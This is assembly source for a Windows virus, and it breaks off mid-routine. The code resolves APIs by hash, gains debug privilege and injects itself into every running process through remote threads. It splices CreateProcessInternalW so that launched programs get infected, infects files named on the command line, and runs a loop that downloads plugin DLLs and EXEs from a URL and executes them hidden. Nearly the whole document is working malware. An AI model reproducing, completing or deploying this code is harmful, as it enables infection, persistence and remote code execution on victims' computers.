.586
.model flat, stdcall

include windows.inc
 
VirBodySize   = @endvir - @VirBody

SIGNATURE		= 'ANGR' ; for func splacing


	TStackMem STRUC
		
		PrevStack			dd 0h
		
		; ---------------
		; STARTF
		; ---------------
		
		CloseHandle 		dd 0h
		CreateFileA 		dd 0h
		CreateFileW			dd 0h
		CreateProcess		dd 0h
		CreateProcessIntW	dd 0h
		CreateThread		dd 0h
		CreateRemoteThread	dd 0h
		CreateSnapshot		dd 0h
		DeleteFileA 		dd 0h
		FreeLibrary			dd 0h
		GetCommandLine		dd 0h
		GetCurrentProcessId	dd 0h
		GetFileSize			dd 0h
		GetSystemDir		dd 0h
		GetVolumeInfo		dd 0h
		GetVersionExA		dd 0h
		LoadLibraryA 		dd 0h
		LocalAlloc 			dd 0h
		LocalFree 			dd 0h
		LocalReAlloc 		dd 0h	
		OpenProcess			dd 0h
		Process32First		dd 0h
		Process32Next		dd 0h
		ReadFile 			dd 0h
		ReadProcessMemory	dd 0h
		SetCurrentDir		dd 0h
		SetFilePointer		dd 0h
		Sleep				dd 0h
		TerminateProcess	dd 0h
		VirtualAllocEx		dd 0h
		VirtualFreeEx		dd 0h
		VirtualProtect		dd 0h
		VirtualProtectEx	dd 0h
		VirtualQueryEx		dd 0h
		WriteFile 			dd 0h
		WriteProcessMemory	dd 0h
		
		
		; AdvApi Functions
		
		AdjustPrivileges	dd 0h
		LookupPrivilegeVal	dd 0h
		OpenProcessToken	dd 0h
		
		
		; WinInet Functions
		
		InternetCloseHandle	dd 0h
		InternetGetState 	dd 0h
		InternetOpenA		dd 0h
		InternetOpenUrlA	dd 0h
		InternetReadFile	dd 0h
		
		; User32 Functions
		MessageBoxW			dd 0h
		
		; ---------------
		; ENDF
		; ---------------
		
		
		
		XDelta				dd 0
		
		; API find
		AddrOfNameOrd		dd 0
		AddressOfFunc		dd 0
		
		; RandomGen
		dwRndSeed			dd 0			
		
		; Processes injector
		ProcFindHandle		dd 0
		OsVer				OSVERSIONINFO <>
		ProcEntry			PROCESSENTRY32 <>
		
		; GetDebug
		hToken				dd 0
		State				TOKEN_PRIVILEGES <>
		
		; Splacing function	                    
		prevcodes			dd 0, 0 
		 					dw 0
		
		; Polymorph
		dwCodeSize			dd 0
		dwResCodeSize		dd 0
		
		pCode				dd 0
		pCrypter			dd 0	; Executable
		
		bA					db 0
		Registers			dw 0
		
		; File-infector
		flag				db 0
		pszfname			dd 0	; points to UNICODE file-name (only for WinNT)
		pHandle				dd 0
		dwFileSize			dd 0
		pMemFile			dd 0
		
		pMainSect			dd 0
		dwOEP				dd 0
		
		dwVirSizeAlligned	dd 0
		dwCodeSizeAlligned	dd 0
		dwOverlaySize		dd 0
		
		pResultCode			dd 0
		
		; Plugins works
		pPlugHandle			dd 0	; Local file handler
		pFileStruct			dd 0	; Pointer to z 1st local struct
		pFileStructsSize	dd 0	; Sizeof structs buff
		pFileStructsNum		dd 0	; Amount of structs
		pFileHandles		dd 0	; List of loaded plugins		
		
		pPlugBuff			dd 0	; @Download
		pFileName			dd 0	; Current plugin fname
		pFileNameLen		dd 0	; strlen(fname)

		PNetHandle			dd 0	; FOR
		PNetHandle2			dd 0	;	WININET
		
		pNetURL				dd 0	; Pointer in struct buff. URL.
		pNetFileStruct		dd 0	; Pointer to z 1st net struct
		pNetFileStructsNum	dd 0	; Amount of structs
		
		
		; Create Process
		ProcInfo			PROCESS_INFORMATION <>
		StartInfo			STARTUPINFO <>
		
	TStackMem ENDS


	TFileStruct STRUC
		
		pFileName			dd 0
		dwFsize				dd 0
		dwLastUpdate		dd 0
		btType				db 0 ; 0 - DLL, 1 - EXE
		
	TFileStruct ends

.code

start:

assume ebp : ptr TStackMem
; -----------------------------------------------------------------

@VirBody:		; Crypted code

jmp @VirMain

include engine.asm


; CONSTANT DATA
	
@FuncBegin:	

	; Functions needn't sorting
	
	; Kernel Functions.

	CloseHandle 		dd 0AF1A15A0h
	CreateFileA 		dd 0A6200CB5h
	CreateFileW			dd 0B0200CB5h
	CreateProcessA		dd 0677CDD94h
	CreateProcessIntW	dd 04A75C894h			; for splacing CreateProcessInternalW
	CreateThread		dd 0D0942012h
	CreateRemoteThread	dd 02638B9F5h
	CreateSnapshot		dd 0E0A05F43h
	DeleteFileA 		dd 0AF370CB1h
	FreeLibrary			dd 0BA3B39AAh
	GetCommandLineA		dd 0D05B7BF6h
	GetCurrentProcessId	dd 0931B139Ah
	GetFileSize			dd 0B02114A8h
	GetSystemDir		dd 0981A1796h
	GetVolumeInfo		dd 044EFA909h
	GetVersionExA		dd 05FFA862Bh
	LoadLibraryA 		dd 0EABE2639h
	LocalAlloc 			dd 01F17B0CBh
	LocalFree 			dd 01DB9D57Bh
	LocalReAlloc 		dd 0FEAD0314h
	OpenProcess			dd 0BD2321B0h
	Process32First		dd 061309FB1h
	Process32Next		dd 03795BD1Dh
	ReadFile 			dd 0BCC95E52h
	ReadProcessMemory	dd 03D85D65Bh
	SetCurrentDir 		dd 0C79C2612h
	SetFilePointer		dd 04077DFBBh
	Sleep				dd 064D8A13Eh
	TerminateProcess	dd 0B8D66C7Bh
	VirtualAllocEx		dd 04E48EBB5h
	VirtualFreeEx		dd 06BCABF3Fh
	VirtualProtect		dd 04170FCAEh
	VirtualProtectEx	dd 084EB4170h
	VirtualQueryEx		dd 04751E1A8h
	WriteFile 			dd 014A5C466h
	WriteProcessMemory	dd 0092DBAC1h
	
	
	; AdvApi Functions
	
	AdjustPrivileges	dd 061FB852Bh
	LookupPrivilegeVal	dd 04DFB8230h
	OpenProcessToken	dd 08AD8484Eh
	
	
	; WinInet Functions
	
	InternetCloseHandle	dd 0BE1A24B1h
	InternetGetState 	dd 01B9ACB59h
	InternetOpenA		dd 068C2B022h
	InternetOpenUrlA	dd 083DC507Ch
	InternetReadFile	dd 0ADD85E72h
	
	; User32 Functions
	MessageBoxW			dd 085281A8Ch
	
@FuncEnd:

; ---------	
; CONSTANTS
; ---------

	; For LoadLibrary()
	advdllsz			db "advapi32.dll",0
	inetdllsz			db "wininet.dll",0
	userdllsz			db "user32.dll",0
	
	; GetDebug
	DebugNamesz			db "SeDebugPrivilege", 0
	
	; Processes injector
	ProcName			db "TOTALCMD.EXE",0
	ExplorerProc		db "Explorer.EXE",0
	
	; Internet works
	szURL				db "http://localhost/list.apl", 0
	
; ---------	
; VARIABLES
; ---------

	; Splacing function
	opcodes				db 068h		; push dd
	destination			dd 0
		                db 0C3h		; retn
		                dd SIGNATURE
	
	dwReturn			dd 0
	
	
; ---------
; LOCAL
; ---------

	InfectParam			db "infect", 0
	CmdLineLen			dd 0
	
@enddata:

; ~DATA


; Main Vir-Func ---------------------------------------------------
	
@VirMain:
	
	call @Prepare
	call @GetKernel
	call @GetApis
	call @CheckLine
	call @GlobalSystemInstall
	call @ReturnToOEP

	nop
ret

; -----------------------------------------------------------------

@Prepare:

	; Allign eax with 4
	mov 	eax, sizeof (TStackMem) + 3
	shr		eax, 2
	shl		eax, 2


	; Get Stack Space
	mov		ebp, esp
	sub		esp, eax
	
	; Clear
	mov		edi, esp
	mov		ecx, eax
	xor		eax, eax
	rep 	stosb
	
	; PrevStack
	xor		esp, esp
	mov		[esp], ebp ; Save Prev esp value to PrevStack var
	mov		ebp, esp   ; Now ebp points to struct TStackMem
	

	
	; Get Delta Offset
	call 	DeltaOFF
      
DeltaOFF:
	pop 	eax
	sub		eax, offset DeltaOFF
	
	
	; Save delta
	mov		[ebp].XDelta, eax
	
	
	; Ret value restore
	
	mov		eax, [ebp].PrevStack
	add		[ebp].PrevStack, 4
	push	[eax]
	
ret

; -----------------------------------------------------------------

@GetKernel:
	
	assume fs:nothing

	xor     eax, eax
	mov     edi, fs: dword ptr[eax]
	dec     eax

	mov     ecx, eax
	repnz 	scasd
	scasd
	mov     ebx, [edi]
	xor     bx, bx

@find:
	cmp     word ptr[ebx], 'AX'
	jz 		@found
	sub     ebx, 1000h
	jmp 	@find
@found:
	; Kernel Handle in ebx
	
ret

; -----------------------------------------------------------------

@GetApis:

	call 	@GetFuncs
	
	; ADVAPI.DLL
	mov		eax, dword ptr [ebp].XDelta
	lea		eax, dword ptr [eax + advdllsz]
	push 	eax
	call	dword ptr [ebp].LoadLibraryA
	
	mov 	ebx, eax
	call 	@GetFuncs
	
	
	; WININET.DLL
	mov		eax, dword ptr [ebp].XDelta
	lea		eax, dword ptr [eax + inetdllsz]
	push 	eax
	call	dword ptr [ebp].LoadLibraryA
	
	mov		ebx, eax
	call 	@GetFuncs
	
	
	; USER32.DLL
	mov		eax, dword ptr [ebp].XDelta
	lea		eax, dword ptr [eax + userdllsz]
	push 	eax
	call	dword ptr [ebp].LoadLibraryA	
	
	mov 	ebx, eax
	call 	@GetFuncs

ret

; -----------------------------------------------------------------

@GetFuncs:
	
	; GetProcAddress
	mov     edx, dword ptr [ebx + 3ch]		; PE
	mov     esi, dword ptr [ebx + edx + 78h]; Export Table RVA
	lea     esi, [ebx + esi + 18h]			; Export Table VA+18h
	lodsd
	xchg    eax, ecx						; NumberOfNames       
	lodsd     								; AddressOfFunctions
	
	add     eax, ebx
	mov 	dword ptr[ebp].AddressOfFunc, eax
	
	lodsd									; AddressOfNames   
	add     eax, ebx
	xchg    eax, edx
	lodsd									; AddressOfNameOrdinals
	
	add     eax, ebx
	mov 	dword ptr [ebp].AddrOfNameOrd, eax
	
	; ecx - NumberOfNames, edx - AddressOfNames
	

	mov     esi, edx 						; Load from AddressOfNames
	
	.Repeat		; loop until all functions r not checked
		lodsd
		add     eax, ebx
		
		; StrToHash
		mov     edx, 0BDC45214h				; Magic value ;)
		
		push 	ebx
		
		.Repeat		
			mov     ebx, edx
			shl     edx, 6
			shr     ebx, 26
			or		edx, ebx
			ror 	edx, 14
			inc 	eax
			movzx   ebx, byte ptr[eax]
			xor 	edx, ebx
		.Until	ebx == 0	
		
		pop 	ebx
		; ~StrToHash, hash in edx
		
		mov 	eax, edx
		mov		edi, dword ptr[ebp].XDelta
		lea 	edi, dword ptr[edi + CloseHandle]
		
		push 	ecx
		mov 	ecx, (@FuncEnd - @FuncBegin) / 4
		repne   scasd
		pop		ecx
		
		
		.If ZERO?
			
			; Get offset in stack
			mov		eax, dword ptr[ebp].XDelta
			lea 	eax, dword ptr[eax + CloseHandle]
			
			sub		edi, eax
			xchg	edi, eax
			lea 	edi, dword ptr[ebp].CloseHandle
			add 	edi, eax
			
			
			; Found! save...
			mov 	edx, dword ptr [ebp].AddrOfNameOrd		
			movzx	edx, word ptr [edx]
			shl 	edx, 2
			add		edx, dword ptr [ebp].AddressOfFunc			  	
			mov 	edx, [edx]
			add 	edx, ebx		
			
			sub		edi, 4
			mov 	dword ptr [edi], edx
			
		.EndIf
		
		add 	word ptr [ebp].AddrOfNameOrd, 2			; Next ordinal word
		
	.Untilcxz
	
ret
; -----------------------------------------------------------------
; API loaded.

; -----------------------------------------------------------------
@CheckLine:
	
	mov		eax, dword ptr[ebp].XDelta
	
	test	eax, eax
	jnz		@EndCheckLine	;	v r in host
	
	
	call	dword ptr[ebp].GetCommandLine
	
	mov		edi, eax
	push	edi
	
	
	xor 	eax, eax
	mov 	ecx, 0ffh
	repnz 	scasb
	
	not		cl
	dec		ecx			; strlen
	
	mov		edx, offset CmdLineLen
	mov		[edx], ecx
	
	pop		edi
	
	mov		esi, offset InfectParam
	
	
	xor 	al, '-'
	mov 	ecx, [edx]
	repnz 	scasb
	jnz		@EndCheckLine
	
	mov		ecx, 6
	repz	cmpsb
	jnz		@EndCheckLine
	inc		edi
	
	;		Infect Selected file
	mov		dword ptr[ebp].pszfname, edi
	mov		byte ptr[ebp].flag, 1
	call	@FileInfectInt
	
	pop		eax	; ret value
	call @ReturnToOEP
	
	@EndCheckLine:
	
ret

; -----------------------------------------------------------------

@GlobalSystemInstall:
	
	; GetOS
	mov		dword ptr[ebp].OsVer.dwOSVersionInfoSize, sizeof (OSVERSIONINFO)
	lea		eax, dword ptr[ebp].OsVer
	
	push 	eax
	call 	dword ptr[ebp].GetVersionExA
	
	
	; Get Debug Privilegies
	
	.If dword ptr[ebp].OsVer.dwPlatformId != VER_PLATFORM_WIN32_NT
		
		ret
		
	.EndIf
	
	
	call 	@GetDebug
	
	; Find all processes

	push 	0
	push 	TH32CS_SNAPPROCESS
	call 	dword ptr [ebp].CreateSnapshot
	mov		dword ptr [ebp].ProcFindHandle, eax


	mov		dword ptr[ebp].ProcEntry.dwSize, sizeof(PROCESSENTRY32)


	lea 	eax, dword ptr [ebp].ProcEntry
	push 	eax 
	push 	dword ptr [ebp].ProcFindHandle
	call 	dword ptr [ebp].Process32First
	
	
	.While	eax
		
		lea 	esi, dword ptr[ebp].ProcEntry.szExeFile
		mov 	eax, dword ptr[ebp].ProcEntry.th32ProcessID
		call 	@Inject
		
		lea 	eax, dword ptr [ebp].ProcEntry
		
		push 	eax 
		push 	dword ptr [ebp].ProcFindHandle
		call 	dword ptr [ebp].Process32Next
		
	.Endw


ret

; -----------------------------------------------------------------

@GetDebug:
	
	call 	dword ptr[ebp].GetCurrentProcessId
	
	push 	eax
	push 	0
	push 	PROCESS_ALL_ACCESS	
	call 	dword ptr[ebp].OpenProcess
	
	xchg	ebx, eax
	lea 	edx, dword ptr[ebp].hToken
	
	push	edx
	push 	TOKEN_ADJUST_PRIVILEGES
	push	ebx
	call 	dword ptr[ebp].OpenProcessToken
	
	push	ebx
	call	dword ptr[ebp].CloseHandle
	
	lea		edx, TOKEN_PRIVILEGES ptr[ebp].State.Privileges.Luid
	mov		ecx, dword ptr[ebp].XDelta
	lea		ecx, dword ptr[ecx + DebugNamesz]

	push	edx
	push	ecx
	push 	NULL
	call 	dword ptr[ebp].LookupPrivilegeVal
	
	mov 	dword ptr[ebp].State.Privileges.Attributes, SE_PRIVILEGE_ENABLED
	
	lea		eax, TOKEN_PRIVILEGES ptr[ebp].State
	
	push 	NULL
	push 	NULL
	push	NULL
	push	eax
	push 	0
	push 	dword ptr[ebp].hToken
	call 	dword ptr[ebp].AdjustPrivileges
	
	
	push 	dword ptr[ebp].hToken
	call 	dword ptr[ebp].CloseHandle

ret

; -----------------------------------------------------------------

@Inject:

	push 	eax
	push 	0
	push 	PROCESS_ALL_ACCESS	
	call 	dword ptr[ebp].OpenProcess
	
	xchg 	ebx, eax	
	
	push 	0
	
	push	NULL
	push	4
	push	esp
	push 	dword ptr[ebp].CreateProcessIntW[6]
	push 	ebx
	call	dword ptr[ebp].ReadProcessMemory
	
	pop 	eax
	
	.If eax == SIGNATURE
		
		push	ebx
		call 	dword ptr [ebp].CloseHandle
		
		ret
		
	.EndIf
	
	push 	PAGE_EXECUTE_READWRITE
	push 	MEM_COMMIT
	push 	VirBodySize + sizeof(TStackMem)
	push	0
	push 	ebx
	call	dword ptr[ebp].VirtualAllocEx
	
	push	eax
	
	mov		edi, eax
	mov		esi, [ebp].XDelta
	lea 	esi, [esi + @VirBody]	; Write ALL virus
	
	push	NULL
	push	VirBodySize
	push	esi
	push	666
	push 	edi
	push 	ebx
	call	dword ptr[ebp].WriteProcessMemory
	
	add		edi, VirBodySize
	mov 	esi, ebp	; Write Stack Structure
	
	push	NULL
	push	sizeof(TStackMem)
	push	esi
	push 	edi
	push 	ebx
	call	dword ptr[ebp].WriteProcessMemory
	

	push	esi
	lea 	esi, dword ptr[ebp].ProcEntry.szExeFile
	
	mov		edi, [ebp].XDelta
	add 	edi, offset ExplorerProc	; "Explorer.EXE"
	mov 	ecx, 13
	repz	cmpsb
	
	pop		esi
	pop		edi
	
	.If !ZERO?
		
		add 	edi, @SplaceThread - @VirBody	; Run Infect Thread
		
	.Else
		
		add 	edi, @VirThread - @VirBody	; Run Main Vir Thread
		
	.EndIf
	
	
	
	push 	0	; Buffer for dwWritten
	
	push	esp
	push	NULL
	push 	edi
	push 	edi
	push 	NULL
	push 	NULL
	push 	ebx
	call	dword ptr[ebp].CreateRemoteThread

	pop 	eax
	

	push	ebx
	call 	dword ptr [ebp].CloseHandle

ret

; -----------------------------------------------------------------

@Prepare_th:

	call	$+5
	@@:
	pop		eax
	sub		eax, @b
	
	lea		ebp, [eax + @StackStruct]
	mov		[ebp].XDelta, eax
	
retn

; -----------------------------------------------------------------

@SplaceThread:

	call	@Prepare_th
	; Ready To Work

	; Why CreateProcessInternalW? 
	;
	; CreateProcessA calls CreateProcessInternalA, it calls CreateProcessInternalW
	; CreateProcessW calls CreateProcessInternalW directly
	; ShellExecute calls ShellExecuteEx calls... calls... CreateProcessInternalW
	
	; CreateProcessA				CreateProcessW				ShellExecute
	;		|							   |						  |
	; CreateProcessInternalA			   |						.....
	;		|							   |						  |
	;		-------------------------------|---------------------------		
	;							CreateProcessInternalW
	;
	; There is sequience of transformations ;)
	;

	push 	0
	
	push 	esp
	push	PAGE_EXECUTE_WRITECOPY
	push	10
	push 	dword ptr[ebp].CreateProcessIntW
	call	dword ptr[ebp].VirtualProtect		; Now v can change some bytes in func
	
	pop 	eax

	
	mov		esi, dword ptr[ebp].CreateProcessIntW
	lea 	edi, dword ptr[ebp].prevcodes
	mov 	ecx, 10
	
	rep		movsb	; Save Previous Bytes
	
	
	mov		eax, dword ptr[ebp].XDelta
	lea		ecx, dword ptr [eax + @Splaced]
	mov 	dword ptr[eax + destination], ecx
	
	lea 	esi, dword ptr[eax + opcodes]
	mov		edi, dword ptr[ebp].CreateProcessIntW
	mov 	ecx, 10
	
	rep		movsb	; Write New Bytes
	

ret

; -----------------------------------------------------------------

@VirThread:	; Main vir thread

	call	@Prepare_th
	; Ready To Work


	; Create Infect Thread

	push	0 ; in NT-systems
	push	0
	push	0 ; param
	
	mov		eax, [ebp].XDelta
	add 	eax, offset @SplaceThread
	push	eax
	
	push	0
	push	0
	call 	dword ptr[ebp].CreateThread
	
	; PLUGING WORKS....
	
	push	256
	push 	LMEM_FIXED OR LMEM_ZEROINIT
	call 	dword ptr[ebp].LocalAlloc
	xchg	eax, ebx
	
	
	push	255
	push	ebx
	call	dword ptr[ebp].GetSystemDir
	
	
	; --------------------------------------------------
	xor		eax, eax
	xor		ecx, ecx
	dec		cl
	mov		edi, ebx
	repnz	scasb		; strlen
	
	dec		edi
	mov		al, '\'
	stosb				; add '\'
	; --------------------------------------------------
	
	
	push	ebx
	call	dword ptr[ebp].SetCurrentDir
	
	
	; --------------------------------------------------
	mov		esi, ebx
	lodsd				; in eax "X:\?"
	
	shl		eax, 8
	shr		eax, 8		; in eax "X:\", 0
	
	push	eax
	mov		eax, esp
	
	push	'S'
	mov		ecx, esp	; buff for Serial Number
	; --------------------------------------------------
	
	push 	0
	push	0
	push	0
	push	0
	push	ecx			; S/N
	push	0
	push	0
	push	eax			; Root Directory
	call	dword ptr[ebp].GetVolumeInfo
	
	pop		edx			; SERIAL NUMBER
	pop		eax
	
	
	; IntToHexStr
	mov 	ecx, 8				; 32/8 - read down 4 bits
	
	.Repeat 
		xor 	eax, eax
		shld 	eax, edx, 4		; XXXXXXXXX <- shift 4 into еах (1111 == 15)
		shl 	edx, 4
		
		.if 	eax >= 0ah		; If val > 10 - Liter, else Digit
			
			add al, 'A' - 10
			
		.else
			
			add al, '0'
			
		.endif
		
		stosb
		
	.Untilcxz
	; ~IntToHexStr
	
	
	push	0
	push	0
	push	OPEN_ALWAYS
	push	0
	push	0
	push	GENERIC_READ  or GENERIC_WRITE
	push	ebx
	call 	dword ptr[ebp].CreateFileA		; Try to open or create file
	mov		dword ptr[ebp].pPlugHandle, eax
	
	push	ebx
	call	dword ptr[ebp].LocalFree
	
	
	; Handles buff
	push	4096
	push 	LMEM_FIXED OR LMEM_ZEROINIT
	call 	dword ptr[ebp].LocalAlloc
	mov		dword ptr[ebp].pFileHandles, eax
	
	
	call	@ProcessPlugFile
	
	
	;--------------------------------------------------------------
	; INTERNET
	;--------------------------------------------------------------
	
	
	push	'buff'
	mov		eax, esp
	
	push	0
	push	0
	push	0
	push	INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY
	push	eax
	call	dword ptr[ebp].InternetOpenA
		
	mov		dword ptr[ebp].PNetHandle, eax
	pop		eax	

@UpdateThreadLoop:
	
	@TryToDownload:
	
		push	0EA60h	; just a minute ;)
		call	dword ptr[ebp].Sleep
		
		mov		eax, dword ptr[ebp].XDelta
		add		eax, offset szURL	
		
		call	@Download
		
		test	eax, eax
	jz		@TryToDownload	; not connected
	
	
	mov		ebx, dword ptr[ebp].pPlugBuff
	mov		eax, [ebx]
	mov		dword ptr[ebp].pNetFileStructsNum, eax
	add		ebx, 4
	
	mov		dword ptr[ebp].pNetFileStruct, ebx
	
	
	; Check 4 Updates

	call	@Check4Updates

	
	push	01B7740h	; half hour period
	call	dword ptr[ebp].Sleep
	
	; Free Resources
	
	mov		eax, dword ptr[ebp].pNetFileStruct
	sub		eax, 4
	push	eax
	call	dword ptr[ebp].LocalFree
	
	xor		eax, eax
	mov		dword ptr[ebp].pNetFileStruct, eax
	mov		dword ptr[ebp].pNetFileStructsNum, eax
	
	jmp		@UpdateThreadLoop
	
	
	;push	dword ptr[ebp].PNetHandle
	;call	dword ptr[ebp].InternetCloseHandle
	
retn

; -----------------------------------------------------------------

@ProcessPlugFile:	; Read, Parse, Exec.
	
	; Read File
	
	push	0
	push	dword ptr[ebp].pPlugHandle
	call	dword ptr[ebp].GetFileSize
	
	mov		edi, eax		; size
	
	sub		eax, 4
	mov		dword ptr[ebp].pFileStructsSize, eax
	
	
	push	edi
	push 	LMEM_FIXED OR LMEM_ZEROINIT
	call 	dword ptr[ebp].LocalAlloc
	xchg	eax, ebx
	
	
	push	'buff'
	mov		eax, esp
	
	push	0
	push	eax
	push	edi
	push	ebx
	push	dword ptr[ebp].pPlugHandle
	call 	dword ptr[ebp].ReadFile
	
	pop		eax
	test	eax, eax
	jnz		@f
	
	push	ebx
	call 	dword ptr[ebp].LocalFree
	
	xor		eax, eax
	mov		dword ptr[ebp].pFileStruct, eax
	mov		dword ptr[ebp].pFileStructsNum, eax
	mov		dword ptr[ebp].pFileStructsSize, eax
	
	retn
	@@:
	
	
	; Parse File n Exec Modules
	
	mov		esi, ebx
	lodsd
	mov		dword ptr[ebp].pFileStructsNum, eax
	mov		ecx, eax
	mov		dword ptr[ebp].pFileStruct, esi
	mov		edi, dword ptr[ebp].pFileHandles
	
	.Repeat		; ebx - pFStruc, edi - pHandleStruc
		
		push	ecx
		push	esi		; save pointer to fname
		
		xchg	esi, edi
		mov		cl, 0ffh
		xor		eax, eax
		repnz	scasb	; to z end of str
		xchg	esi, edi
		
		add		esi, 8	; skip fsize, fver
		
		lodsb			; type
		
		call	@ExecutePlugin
		
		stosd
		pop		ecx
		
	.Untilcxz
	
retn

; -----------------------------------------------------------------

@ExecutePlugin:	; IN: al - type, INSTACK - fname
				; OUT: eax - handle

	
	test	al, al
	jnz		@itzexe
	
	@itzdll:
		
		call 	dword ptr[ebp].LoadLibraryA
		jmp		@execdone
		
	@itzexe:
		
		pop		edx	; return value
		pop		eax
		push	edx
		
		push	ebx
		
		lea		ebx, dword ptr[ebp].ProcInfo
		assume	ebx: ptr PROCESS_INFORMATION
		push	ebx
		
		lea		edx, dword ptr[ebp].StartInfo
		assume	edx: ptr STARTUPINFO
		mov		[edx].cb, sizeof STARTUPINFO
		mov		[edx].wShowWindow, SW_HIDE
		push	edx
		
		push	NULL
		push	NULL
		push	NULL
		push	NULL
		push	NULL
		push	NULL
		push	NULL
		push	eax
		call 	dword ptr[ebp].CreateProcess
		
		mov		eax, [ebx].hProcess
		
		assume	ebx: nothing
		assume	edx: nothing
		
		pop		ebx
		
	@execdone:


retn

; -----------------------------------------------------------------

@Check4Updates:


	; Check & remove unnecessary plugins
	
	mov		ecx, dword ptr[ebp].pFileStructsNum
	mov 	edi, dword ptr[ebp].pFileStruct
	mov		ebx, dword ptr[ebp].pFileHandles
	
	test	edi, edi
	jz		@RemovePlEndLoop	; nothing to remove
	
	@RemovePlLoop:
		
		mov		esi, dword ptr[ebp].pNetFileStruct
		
		mov		dword ptr[ebp].pFileName, edi
		
		push	ecx			; for incycle
		
		
		; Find End Of FileName
		
		xor		eax, eax
		mov		cl, 0ffh
		
		repnz	scasb	; Local
		dec		edi		; now points to z end of filename
		
		not		cl
		movzx	ecx, cl
		dec		ecx		; in ecx - strlen(fname_disk)
		
		mov		dword ptr[ebp].pFileNameLen, ecx		
		
		
		mov		ecx, dword ptr[ebp].pNetFileStructsNum
		xor		eax, eax ; flag
		
		test	ecx, ecx
		jz		@DeleteAll
		
		.Repeat
			
			push	edi
			push	ecx
			
			xchg	edi, esi
			mov		cl, 0ffh
			
			repnz	scasb	; Net
			dec		edi
			
			xchg	edi, esi
			
			
			pushad
				
				std
				mov		ecx, dword ptr[ebp].pFileNameLen
				repe	cmpsb
				cld
				
			popad
			
			.If ZERO? 
				
				inc		eax	; set flag
				pop		ecx
				pop		edi
				.Break
				
			.endif
			
			add		esi, 10
			pop		ecx
			pop		edi
			
		.Untilcxz
		
		inc		edi	; edi point to z fsize
		
		@DeleteAll:
		
		
		.If eax == 0	; Remove plugin
			
			; Unload
			mov		al, byte ptr[edi + 8] ; type
			call	@UnloadPlugin
			
			push	edi
			
			mov		edi, ebx
			mov		esi, ebx
			add		esi, 4		; handles before ..<edi>.. deleted ..<esi>.. after
			
			mov		ecx, [esp + 4]
			dec		ecx
			
			rep		movsd
			
			pop		edi
			
			; Delete
			push	dword ptr[ebp].pFileName
			call	dword ptr[ebp].DeleteFileA
			
			
			; Shift struct, truncate
			add		edi, 9		; pNext
			mov		edx, edi
			mov		eax, dword ptr[ebp].pFileName
			sub		edx, eax	; in edx - sizeof (curr_struc)
			
			xchg	esi, edi
			mov		edi, eax	; xxxxx|edi|..unnecessary struc..|esi|xxxxx
			push	edi
			
			mov		ecx, dword ptr[ebp].pFileStruct
			add		ecx, dword ptr[ebp].pFileStructsSize
			sub		ecx, esi
			
			rep 	movsb		; shift struc
			pop		edi
			
			sub		dword ptr[ebp].pFileStructsSize, edx
			
			push	LMEM_ZEROINIT or LMEM_MOVEABLE
			push	dword ptr[ebp].pFileStructsSize
			add		dword ptr[esp], 4
			push	dword ptr[ebp].pFileStruct
			sub		dword ptr[esp], 4
			call	dword ptr[ebp].LocalReAlloc
			
			add		eax, 4
			mov		dword ptr[ebp].pFileStruct, eax
			
			
			dec		dword ptr[ebp].pFileStructsNum
			
			call	@RenewPlugFile
			
			jmp		@RemovePl@EndLoop
			
		.else
			
			add		edi, 9
			
		.endif
		
		add		ebx, 4
		
	@RemovePl@EndLoop:
	pop		ecx
	dec	ecx
	jnz @RemovePlLoop

	@RemovePlEndLoop:
	


	; ADD || RENEW plugin

	mov		ecx, dword ptr[ebp].pNetFileStructsNum
	mov		esi, dword ptr[ebp].pNetFileStruct
	
	cmp		dword ptr[ebp].pNetFileStructsNum, 0
	jz		@RefreshPlEndLoop
	
	@RefreshPlLoop:
		
		mov 	edi, dword ptr[ebp].pFileStruct
		
		mov		dword ptr[ebp].pNetURL, esi
		
		push	ecx			; for incycle
		
		
		; Check filename length
		
		xchg	edi, esi
		
		xor		ecx, ecx
		xor 	eax, eax
		mov		cl, 0ffh
		repnz	scasb	; Net
		
		std
		xor 	al, '/'
		mov		cl, 0ffh
		repnz	scasb	; Net
		cld
		
		add		edi, 2
		
		not		cl		; in ecx - strlen(fname_net)
		dec		ecx
		dec		ecx
		mov		dword ptr[ebp].pFileNameLen, ecx			
		
		xchg	edi, esi
		
		
		mov		ecx, dword ptr[ebp].pFileStructsNum
		mov		ebx, dword ptr[ebp].pFileHandles
		
		xor		eax, eax
		
		test	ecx, ecx
		jz		@NothingRenew
		
		.Repeat	; Check for equals
			
			push	esi
			push	ecx
			
			
			mov		ecx, dword ptr[ebp].pFileNameLen
			repz	cmpsb
			
			
			.if	ZERO?	; OK, compare version
				
				; both edi and esi points to z end fname
				;movsb	; for increacing edi & esi
				
				push	esi
				push	edi
				
				movsd	; fsize
				cmpsd	; fver
				
				pop		edi
				pop		esi
				
				.If !ZERO?	; Update needly
					
					push	ebx	; because in @Download it changes
					
					; Download New Ver Of File
					
					mov		eax, dword ptr[ebp].pNetURL
					
					call	@Download
					
					test	eax, eax
					jnz		@Downloaded
					
					add		esp, 16
					jmp		@TryToDownload	; not connected or connection interrupted
					
					@Downloaded:
					
					
					; Unload previous ver of plugin
					mov		al, byte ptr[esi + 8]
					pop		ebx
					call	@UnloadPlugin
					
					
					; Write new plugin on disk
					mov		eax, esi
					sub		eax, dword ptr[ebp].pFileNameLen
					mov		edx, [esi]
					
					call	@WritePlugFile
					
					push	eax		; for @ExecutePlugin
					
					
					; Free buffer allocated by @Download proc
					push	dword ptr[ebp].pPlugBuff
					call	dword ptr[ebp].LocalFree
					
					; Renew local struct
					movsd
					movsd
					movsb
					
					call	@RenewPlugFile
					
					
					; Execute Plugin
					mov		al, byte ptr[esi-1] ; type
					call	@ExecutePlugin		; fname already in stack
					mov		[ebx], eax
					
				.Endif
				
				pop		ecx
				pop		esi
				xor		eax, eax
				inc		eax
				.Break
				
			.Endif
			
			
			xor 	eax, eax
			mov		cl, 0ffh
			repnz	scasb	; to z end of line
			
			add		edi, 9 	; 4 + 4 + 1			
			
			
			pop		ecx
			pop		esi
			
			add		ebx, 4	; next handle
			xor		eax, eax
			
		.Untilcxz
		
		@NothingRenew:
		
		
		; esi points to z end of URL
		.If eax == 0	; Plugin not found -> add it
			
			; Download New Ver Of File
			push	ebx	; because in @Download it changes
			
			mov		eax, dword ptr[ebp].pNetURL
			call	@Download
			
			test	eax, eax
			jnz		@Downloaded2
			
			add		esp, 12
			jmp		@TryToDownload	; not connected
			
			@Downloaded2:
			
			pop		ebx
			
			; Write new plugin on disk
			mov		eax, esi
			mov		edi, esi
			
